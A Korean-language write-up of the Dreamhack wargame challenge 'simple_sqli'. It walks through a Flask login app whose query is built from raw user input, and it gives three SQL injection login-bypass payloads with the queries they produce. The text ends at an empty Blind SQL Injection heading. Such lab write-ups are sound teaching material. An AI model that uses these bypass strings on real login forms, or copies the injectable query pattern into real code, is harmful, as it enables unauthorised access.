# [Dreamhack Wargame] simple_sqli
### [🚩simple_sqli](https://dreamhack.io/wargame/challenges/24/)
  <img width="1072" alt="simple_sqli_description" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/c3e5faf9-a315-495b-a321-7a56e14f54ca">

<br/><br/>

## 문제 파일(app.py) 분석
```python
#!/usr/bin/python3
from flask import Flask, request, render_template, g
import sqlite3
import os
import binascii

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open('./flag.txt', 'r').read() # flag.txt 파일로부터 FLAG 데이터를 가져옴
except:
    FLAG = '[**FLAG**]'


# 데이터베이스
DATABASE = "database.db" # 데이터베이스 파일명을 database.db로 설정 (database.db 파일로 데이터베이스를 관리함)
if os.path.exists(DATABASE) == False: # 데이터베이스 파일이 존재하지 않는 경우
    # 데이터베이스 파일 생성 및 연결
    db = sqlite3.connect(DATABASE)
    
    # users 테이블 생성 (CREATE TABLE로 userid, userpassword를 열로 가지는 테이블을 생성함)
    db.execute('create table users(userid char(100), userpassword char(100));')
    # users 테이블에 관리자와 guest 계정을 생성 (INSERT INTO 사용)
    db.execute(f'insert into users(userid, userpassword) values ("guest", "guest"), ("admin", "{binascii.hexlify(os.urandom(16)).decode("utf8")}");')
    db.commit() # 쿼리 실행 확정
    
    db.close() # DB 연결 종료



# 데이터베이스 관련 함수
def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    db.row_factory = sqlite3.Row
    return db

def query_db(query, one=True):
    cur = get_db().execute(query)
    rv = cur.fetchall()
    cur.close()
    return (rv[0] if rv else None) if one else rv

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()



# 인덱스 페이지
@app.route('/')
def index():
    return render_template('index.html') # 인덱스 페이지(index.html)를 화면에 출력 (render_template 함수 사용)



# 로그인 페이지
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET': # GET 메소드의 요청을 전달할 경우
        return render_template('login.html') # 이용자아게 id와 pw를 요청받는 페이지(login.html)을 화면에 출력
    else: # POST 메소드의 요청을 전달한 경우
        # 이용자의 입력값인 userid, userpassword를 가져옴
        userid = request.form.get('userid')
        userpassword = request.form.get('userpassword')
        
        # users 테이블에서 이용자가 입력한 userid와 userpassword가 일치하는 회원 정보를 불러오는 쿼리(SELECT문) 작성하여 데이터베이스에 전달
        res = query_db(f'select * from users where userid="{userid}" and userpassword="{userpassword}"')
        
        if res: # 쿼리 결과가 존재하는 경우
            userid = res[0] # 로그인할 계정을 해당 쿼리의 결과에서 불러와 사용함
            if userid == 'admin': # 결과로 받은 로그인 계정이 관리자 계정('admin')인 경우
                return f'hello {userid} flag is {FLAG}' # flag를 출력함
                
            return f'<script>alert("hello {userid}");history.go(-1);</script>' # 관리자 계정이 아닌 경우 "hello" 알림창만 출력함
            
        return '<script>alert("wrong");history.go(-1);</script>' # 쿼리 결과가 존재하지 않는 경우 "wrong" 알림창을 출력함


app.run(host='0.0.0.0', port=8000)
```

<br/><br/>


## 문제 풀이
### 취약점이 존재하는 코드
userid와 userpassword를 이용자에게 입력받고, 동적으로 쿼리문을 생성한 뒤 ```query_db``` 함수를 이용해 데이터베이스에 질의함
```python
res = query_db(f’select * from users where userid="{userid}" and userpassword=“{userpassword}”’)
```
* **Raw Query**: 동적으로 생성한 쿼리
	- Raw Query를 생성할 때 이용자의 입력값이 별다른 검사 과정 없이 쿼리문에 포함되면 SQL Injection 취약점에 노출될 수 있음
		+ 쿼리문을 직접 생성하는 방식이 아닌 **Prepared Statement**과 **Object Relational Mapping**(ORM)을 사용해 해결 가능
* 이용자의 입력값을 검사하는 과정이 없기 때문에 임의의 쿼리문을 userid 또는 userpassword에 삽입해 SQL Injection 공격을 수행할 수 있음


<br/><br/>

### 익스플로잇

#### SQL Injection: 관리자의 계정을 모른 채 로그인을 우회하여 풀이하는 방법
* 정상적인 이용자가 로그인을 위해 실행하는 쿼리문
	```SQL
	select * from users where userid=“{userid}” and userpassword=“{userpassword}”
	```
	- 위의 쿼리문을 참고해 admin이라는 결과가 반환되도록 쿼리문을 조작해야 함
		+ SQL은 수많은 조건절을 제공하기 때문에 다양한 방법으로 공격을 시도할 수 있음
* admin 계정으로 로그인할 수 있는 SQL Injection 공격 코드
   1. userid 검색 조건만을 처리하도록, 뒤의 내용은 주석 처리하는 방식
      - userid, userpassword 입력값
		    | userid | userpassword |
        |-----|-----|
        | admin"-- | DUMMY (아무 문자열이나 입력해도 상관 없음) |
        + 생성되는 쿼리문
          ```SQL
          select * from users where userid="admin"--" and userpassword="DUMMY"
          ```

  2. userid 검색 조건 뒤에 ```OR``` 조건을 추가하여 뒤의 내용과 관계없이 admin이 반환되도록 하는 방식
      - userid, userpassword 입력값
		    | userid | userpassword |
        |-----|-----|
        | admin" or "1 | DUMMY (아무 문자열이나 입력해도 상관 없음) |
        + 생성되는 쿼리문
          ```SQL
          select * from users where userid="admin" or "1" and userpassword="DUMMY"
          ```

  3. userid 검색 조건 뒤에 ```or 1```을 추가하여 테이블의 모든 내용을 반환하도록 하고, ```LIMIT``` 절을 이용해 admin 행만 반환하도록 하는 방식
      - userid, userpassword 입력값
		    | userid | userpassword |
        |-----|-----|
        | "" or 1 LIMIT 1,1 -- | DUMMY (아무 문자열이나 입력해도 상관 없음) |
        + 생성되는 쿼리문
          ```SQL
          select * from users where userid="" or 1 LIMIT 1,1--" and userpassword="DUMMY"
          ```


<br/>

#### Blind SQL Injection: 관리자 계정의 비밀번호를 알아내고 올바른 경로로 로그인 하는 방법

